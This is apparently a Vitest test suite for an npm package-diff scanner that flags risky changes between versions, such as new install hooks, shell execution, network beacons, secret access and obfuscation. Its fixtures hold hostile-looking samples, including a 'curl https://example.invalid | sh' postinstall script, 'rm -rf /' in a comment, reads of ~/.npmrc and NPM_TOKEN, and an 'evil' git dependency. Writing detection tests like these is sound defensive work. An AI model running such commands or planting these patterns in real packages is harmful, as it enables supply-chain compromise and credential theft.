import { describe, it, expect } from "vitest";
import { makeContext } from "../helpers/detector-context.js";
import { lifecycleScriptsDetector } from "../../src/detectors/lifecycle-scripts.js";
import { childProcessDetector } from "../../src/detectors/child-process.js";
import { shellExecutionDetector } from "../../src/detectors/shell-execution.js";
import { networkDetector } from "../../src/detectors/network.js";
import { sensitiveEnvDetector } from "../../src/detectors/sensitive-env.js";
import { sensitivePathsDetector } from "../../src/detectors/sensitive-paths.js";
import { dynamicCodeDetector } from "../../src/detectors/dynamic-code.js";
import { executableArtifactsDetector } from "../../src/detectors/executable-artifacts.js";
import { obfuscationDetector } from "../../src/detectors/obfuscation.js";
import { dependenciesDetector } from "../../src/detectors/dependencies.js";
import { packageSizeDetector } from "../../src/detectors/package-size.js";
import { publisherDetector } from "../../src/detectors/publisher.js";
import type { Detector } from "../../src/detectors/types.js";

function assertNoIntroduced(
  detector: Detector,
  oldCtx: ReturnType<typeof makeContext>,
  newCtx: ReturnType<typeof makeContext>
) {
  const oldSignals = detector.analyze(oldCtx);
  const newSignals = detector.analyze(newCtx);
  const findings = detector.diff(oldSignals, newSignals);
  expect(findings, `${detector.code} should not report unchanged behavior as new`).toHaveLength(0);
}

describe("DC001 lifecycle-scripts", () => {
  it("reports new postinstall", () => {
    const before = makeContext({ manifest: {} });
    const after = makeContext({ manifest: { scripts: { postinstall: "node scripts/setup.js" } } });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(before),
      lifecycleScriptsDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("high");
    expect(findings[0]!.code).toBe("DC001");
  });

  it("does not report unchanged postinstall", () => {
    const script = { scripts: { postinstall: "node scripts/setup.js" } };
    assertNoIntroduced(
      lifecycleScriptsDetector,
      makeContext({ manifest: script }),
      makeContext({ manifest: script })
    );
  });

  it("does not report removed postinstall as introduced", () => {
    const before = makeContext({ manifest: { scripts: { postinstall: "node scripts/setup.js" } } });
    const after = makeContext({ manifest: {} });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(before),
      lifecycleScriptsDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("does not flag benign test/build/lint scripts", () => {
    const before = makeContext({ manifest: {} });
    const after = makeContext({
      manifest: { scripts: { test: "vitest", build: "tsc", lint: "eslint ." } }
    });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(before),
      lifecycleScriptsDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("escalates severity for shell-downloader payloads", () => {
    const before = makeContext({ manifest: {} });
    const after = makeContext({
      manifest: { scripts: { postinstall: "curl https://example.invalid | sh" } }
    });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(before),
      lifecycleScriptsDetector.analyze(after)
    );
    expect(findings[0]!.severity).toBe("critical");
  });
});

describe("DC002 child-process", () => {
  const oldSrc = `const cp = require("child_process");\ncp.exec("ls");\n`;
  it("reports new import+call", () => {
    const before = makeContext({ files: { "index.js": "module.exports = {};" } });
    const after = makeContext({ files: { "index.js": oldSrc } });
    const findings = childProcessDetector.diff(
      childProcessDetector.analyze(before),
      childProcessDetector.analyze(after)
    );
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some((f) => f.severity === "high")).toBe(true);
  });

  it("does not report unchanged capability", () => {
    assertNoIntroduced(
      childProcessDetector,
      makeContext({ files: { "index.js": oldSrc } }),
      makeContext({ files: { "index.js": oldSrc } })
    );
  });

  it("import-only is lower severity than confirmed call", () => {
    const before = makeContext({ files: { "index.js": "module.exports = {};" } });
    const after = makeContext({
      files: { "index.js": `import { exec } from "node:child_process";\n` }
    });
    const findings = childProcessDetector.diff(
      childProcessDetector.analyze(before),
      childProcessDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("medium");
  });

  it("ignores references inside comments/strings", () => {
    const before = makeContext({ files: { "index.js": "" } });
    const after = makeContext({
      files: {
        "index.js": `// child_process.exec("rm -rf /")\nconst docs = "use child_process.exec here";\n`
      }
    });
    const findings = childProcessDetector.diff(
      childProcessDetector.analyze(before),
      childProcessDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });
});

describe("DC003 shell-execution", () => {
  it("reports new execSync", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({
      files: { "a.js": `const { execSync } = require("child_process");\nexecSync("whoami");\n` }
    });
    const findings = shellExecutionDetector.diff(
      shellExecutionDetector.analyze(before),
      shellExecutionDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("high");
  });

  it("reports spawn with shell:true but not spawn without it", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const withShell = makeContext({
      files: {
        "a.js": `const { spawn } = require("child_process");\nspawn("ls", [], { shell: true });\n`
      }
    });
    const withoutShell = makeContext({
      files: { "a.js": `const { spawn } = require("child_process");\nspawn("ls", []);\n` }
    });
    expect(
      shellExecutionDetector.diff(
        shellExecutionDetector.analyze(before),
        shellExecutionDetector.analyze(withShell)
      )
    ).toHaveLength(1);
    expect(
      shellExecutionDetector.diff(
        shellExecutionDetector.analyze(before),
        shellExecutionDetector.analyze(withoutShell)
      )
    ).toHaveLength(0);
  });

  it("does not report unchanged shell execution", () => {
    const src = `const { execSync } = require("child_process");\nexecSync("whoami");\n`;
    assertNoIntroduced(
      shellExecutionDetector,
      makeContext({ files: { "a.js": src } }),
      makeContext({ files: { "a.js": src } })
    );
  });
});

describe("DC004 network", () => {
  it("reports new fetch destination", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({
      files: { "a.js": `fetch("https://api.strange-example.invalid/beacon");\n` }
    });
    const findings = networkDetector.diff(
      networkDetector.analyze(before),
      networkDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.newValue).toBe("api.strange-example.invalid");
  });

  it("marks dynamic destinations as such", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({ files: { "a.js": `fetch(someUrl);\n` } });
    const findings = networkDetector.diff(
      networkDetector.analyze(before),
      networkDetector.analyze(after)
    );
    expect(findings[0]!.newValue).toBe("dynamic destination");
  });

  it("does not report an unchanged known destination", () => {
    const src = `fetch("https://registry.npmjs.org/pkg");\n`;
    assertNoIntroduced(
      networkDetector,
      makeContext({ files: { "a.js": src } }),
      makeContext({ files: { "a.js": src } })
    );
  });

  it("reports only the new destination when a second host is added", () => {
    const before = makeContext({ files: { "a.js": `fetch("https://registry.npmjs.org/pkg");\n` } });
    const after = makeContext({
      files: {
        "a.js": `fetch("https://registry.npmjs.org/pkg");\nfetch("https://api.strange-example.invalid");\n`
      }
    });
    const findings = networkDetector.diff(
      networkDetector.analyze(before),
      networkDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.newValue).toBe("api.strange-example.invalid");
  });
});

describe("DC005 sensitive-env", () => {
  it("reports new NPM_TOKEN access as high", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({ files: { "a.js": `console.log(process.env.NPM_TOKEN);\n` } });
    const findings = sensitiveEnvDetector.diff(
      sensitiveEnvDetector.analyze(before),
      sensitiveEnvDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("high");
  });

  it("ignores benign vars like NODE_ENV/CI/HOME/PATH", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({
      files: {
        "a.js": `console.log(process.env.NODE_ENV, process.env.CI, process.env.HOME, process.env.PATH);\n`
      }
    });
    const findings = sensitiveEnvDetector.diff(
      sensitiveEnvDetector.analyze(before),
      sensitiveEnvDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("does not report unchanged env access", () => {
    const src = `console.log(process.env.NPM_TOKEN);\n`;
    assertNoIntroduced(
      sensitiveEnvDetector,
      makeContext({ files: { "a.js": src } }),
      makeContext({ files: { "a.js": src } })
    );
  });

  it("classifies generic *_SECRET pattern as medium", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({ files: { "a.js": `console.log(process.env.MY_APP_SECRET);\n` } });
    const findings = sensitiveEnvDetector.diff(
      sensitiveEnvDetector.analyze(before),
      sensitiveEnvDetector.analyze(after)
    );
    expect(findings[0]!.severity).toBe("medium");
  });
});

describe("DC006 sensitive-paths", () => {
  it("reports a new read of ~/.npmrc via fs.readFileSync", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({
      files: {
        "a.js": `const fs = require("fs");\nconst path = require("path");\nconst os = require("os");\nfs.readFileSync(path.join(os.homedir(), ".npmrc"));\n`
      }
    });
    const findings = sensitivePathsDetector.diff(
      sensitivePathsDetector.analyze(before),
      sensitivePathsDetector.analyze(after)
    );
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some((f) => f.severity === "high")).toBe(true);
  });

  it("treats a mere literal reference as lower-confidence than a confirmed read", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const referenceOnly = makeContext({ files: { "a.js": `const p = ".npmrc";\n` } });
    const findings = sensitivePathsDetector.diff(
      sensitivePathsDetector.analyze(before),
      sensitivePathsDetector.analyze(referenceOnly)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("medium");
  });

  it("does not report unchanged sensitive path access", () => {
    const src = `const fs = require("fs");\nfs.readFileSync(".npmrc");\n`;
    assertNoIntroduced(
      sensitivePathsDetector,
      makeContext({ files: { "a.js": src } }),
      makeContext({ files: { "a.js": src } })
    );
  });
});

describe("DC007 dynamic-code", () => {
  it("reports new eval", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({ files: { "a.js": `eval("2+2");\n` } });
    const findings = dynamicCodeDetector.diff(
      dynamicCodeDetector.analyze(before),
      dynamicCodeDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("high");
  });

  it("ignores eval mentioned only in comments/strings", () => {
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({
      files: { "a.js": `// eval("dangerous")\nconst s = "eval(x)";\n` }
    });
    const findings = dynamicCodeDetector.diff(
      dynamicCodeDetector.analyze(before),
      dynamicCodeDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("does not report unchanged eval usage", () => {
    const src = `eval("2+2");\n`;
    assertNoIntroduced(
      dynamicCodeDetector,
      makeContext({ files: { "a.js": src } }),
      makeContext({ files: { "a.js": src } })
    );
  });
});

describe("DC008 executable-artifacts", () => {
  it("reports a newly packed native addon", () => {
    const before = makeContext({ binaries: [] });
    const after = makeContext({
      binaries: [{ relPath: "build/addon.node", size: 4096, magicType: "native-addon" }]
    });
    const findings = executableArtifactsDetector.diff(
      executableArtifactsDetector.analyze(before),
      executableArtifactsDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("high");
  });

  it("does not report an unchanged native addon present in both versions", () => {
    const bin = [{ relPath: "build/addon.node", size: 4096, magicType: "native-addon" }];
    assertNoIntroduced(
      executableArtifactsDetector,
      makeContext({ binaries: bin }),
      makeContext({ binaries: bin })
    );
  });
});

describe("DC009 obfuscation", () => {
  it("flags a new large base64 blob combined with eval as high severity", () => {
    const blob = "A".repeat(400);
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({ files: { "a.js": `eval("${blob}");\n` } });
    const findings = obfuscationDetector.diff(
      obfuscationDetector.analyze(before),
      obfuscationDetector.analyze(after)
    );
    expect(findings.some((f) => f.severity === "high")).toBe(true);
  });

  it("never asserts malware in its language", () => {
    const blob = "A".repeat(400);
    const before = makeContext({ files: { "a.js": "" } });
    const after = makeContext({ files: { "a.js": `const x = "${blob}";\n` } });
    const findings = obfuscationDetector.diff(
      obfuscationDetector.analyze(before),
      obfuscationDetector.analyze(after)
    );
    for (const f of findings) {
      expect(f.title.toLowerCase()).not.toContain("malware");
      expect(f.description.toLowerCase()).not.toContain("malware");
    }
  });

  it("does not report an unchanged minified bundle", () => {
    const blob = "A".repeat(400);
    const src = `const x = "${blob}";\n`;
    assertNoIntroduced(
      obfuscationDetector,
      makeContext({ files: { "a.js": src } }),
      makeContext({ files: { "a.js": src } })
    );
  });
});

describe("DC010 dependencies", () => {
  it("reports a new git-URL dependency", () => {
    const before = makeContext({ manifest: { dependencies: { lodash: "^4.17.21" } } });
    const after = makeContext({
      manifest: {
        dependencies: { lodash: "^4.17.21", evil: "git+https://example.invalid/evil.git" }
      }
    });
    const findings = dependenciesDetector.diff(
      dependenciesDetector.analyze(before),
      dependenciesDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.title).toContain("evil");
  });

  it("does not flag a normal semver dependency addition as risky", () => {
    const before = makeContext({ manifest: { dependencies: {} } });
    const after = makeContext({ manifest: { dependencies: { lodash: "^4.17.21" } } });
    const findings = dependenciesDetector.diff(
      dependenciesDetector.analyze(before),
      dependenciesDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("does not report an unchanged risky dependency", () => {
    const manifest = { dependencies: { evil: "git+https://example.invalid/evil.git" } };
    assertNoIntroduced(dependenciesDetector, makeContext({ manifest }), makeContext({ manifest }));
  });
});

describe("DC011 package-size", () => {
  it("does not flag a trivial 1KB -> 3KB increase", () => {
    const before = makeContext({
      totalBytes: 1024,
      packedFiles: [{ relPath: "a.js", size: 1024 }]
    });
    const after = makeContext({ totalBytes: 3072, packedFiles: [{ relPath: "a.js", size: 3072 }] });
    const findings = packageSizeDetector.diff(
      packageSizeDetector.analyze(before),
      packageSizeDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("flags a dramatic size jump as low/medium, never high", () => {
    const before = makeContext({
      totalBytes: 210 * 1024,
      packedFiles: new Array(42).fill(0).map((_, i) => ({ relPath: `f${i}.js`, size: 100 }))
    });
    const after = makeContext({
      totalBytes: 4.8 * 1024 * 1024,
      packedFiles: new Array(417).fill(0).map((_, i) => ({ relPath: `f${i}.js`, size: 100 }))
    });
    const findings = packageSizeDetector.diff(
      packageSizeDetector.analyze(before),
      packageSizeDetector.analyze(after)
    );
    expect(findings.length).toBeGreaterThan(0);
    for (const f of findings) expect(["low", "medium"]).toContain(f.severity);
  });
});

describe("DC012 publisher", () => {
  it("reports a publisher change", () => {
    const before = makeContext({ publisher: "alice" });
    const after = makeContext({ publisher: "bob" });
    const findings = publisherDetector.diff(
      publisherDetector.analyze(before),
      publisherDetector.analyze(after)
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.oldValue).toBe("alice");
    expect(findings[0]!.newValue).toBe("bob");
  });

  it("is omitted entirely when publisher data is unavailable", () => {
    const before = makeContext({});
    const after = makeContext({});
    const findings = publisherDetector.diff(
      publisherDetector.analyze(before),
      publisherDetector.analyze(after)
    );
    expect(findings).toHaveLength(0);
  });

  it("does not report when publisher is unchanged", () => {
    assertNoIntroduced(
      publisherDetector,
      makeContext({ publisher: "alice" }),
      makeContext({ publisher: "alice" })
    );
  });
});

describe("cross-detector: ESM/CJS alias equivalence for DC002", () => {
  const variants = [
    `const cp = require("child_process");\ncp.exec("whoami");\n`,
    `const { exec } = require("node:child_process");\nexec("whoami");\n`,
    `import { exec as run } from "node:child_process";\nrun("whoami");\n`,
    `import * as cp from "node:child_process";\ncp.exec("whoami");\n`
  ];
  for (const [i, src] of variants.entries()) {
    it(`detects call form #${i}`, () => {
      const before = makeContext({ files: { "a.js": "" } });
      const after = makeContext({ files: { "a.js": src } });
      const findings = childProcessDetector.diff(
        childProcessDetector.analyze(before),
        childProcessDetector.analyze(after)
      );
      expect(findings.some((f) => f.severity === "high")).toBe(true);
    });
  }
});
